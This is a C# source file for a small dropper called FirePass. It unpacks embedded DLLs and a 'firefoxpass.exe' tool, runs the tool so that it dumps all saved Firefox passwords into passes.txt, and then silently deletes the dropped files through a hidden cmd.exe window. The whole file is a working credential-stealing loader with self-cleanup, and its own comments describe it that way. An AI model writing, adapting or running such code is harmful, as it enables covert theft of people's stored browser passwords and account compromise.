using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace FirePass
{
    class Program
    {
        static void Main(string[] args)
        {
            string file1= "System.Data.SQLite.dll";
            string file2 = "Newtonsoft.Json.dll";
            string file3 = "firefoxpass.exe";
            //////extracting original (password crackers) files...
            extract(file1);
            extract(file2);
            extract(file3);
            ////////////////////starting exe...
            ////////////////////It will create a passes.txt file and save all firefox passwords inside it. ;)
            start(file3);

            //wait for file to stop..
            while (true)
            {
                Process[] pname = Process.GetProcessesByName("firefoxpass");
                if (pname.Length > 0)
                {
                    Console.WriteLine("running");
                }
                else
                {
                    Console.WriteLine("Process Not running");
                    break;
                }
            }
            ////////////////////removing the files....
            del(file1);
            del(file2);
            del(file3);
           
        }
       
         public static void extract(string file)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory;
            Console.WriteLine(path);
            string path2 = path + file;
            extractResource(file, path2);
        }
        public static void start(string file)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory;
            string path2 = path + file;
            Console.WriteLine(path2);
            Process.Start(path2);
        }
        public static void del(string file)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory;
            string path2 = path + file;
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();
            Console.WriteLine(path2);
            cmd.StandardInput.WriteLine("del /f "+path2);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
        }

        public static void extractResource(String embeddedFileName, String destinationPath)
        {
            var currentAssembly = Assembly.GetExecutingAssembly();
            var arrResources = currentAssembly.GetManifestResourceNames();
            foreach (var resourceName in arrResources)
            {
                if (resourceName.ToUpper().EndsWith(embeddedFileName.ToUpper()))
                {
                    using (var resourceToSave = currentAssembly.GetManifestResourceStream(resourceName))
                    {
                        using (var output = File.OpenWrite(destinationPath))
                            resourceToSave.CopyTo(output);
                        resourceToSave.Close();
                    }
                }
            }
        }
    }
}
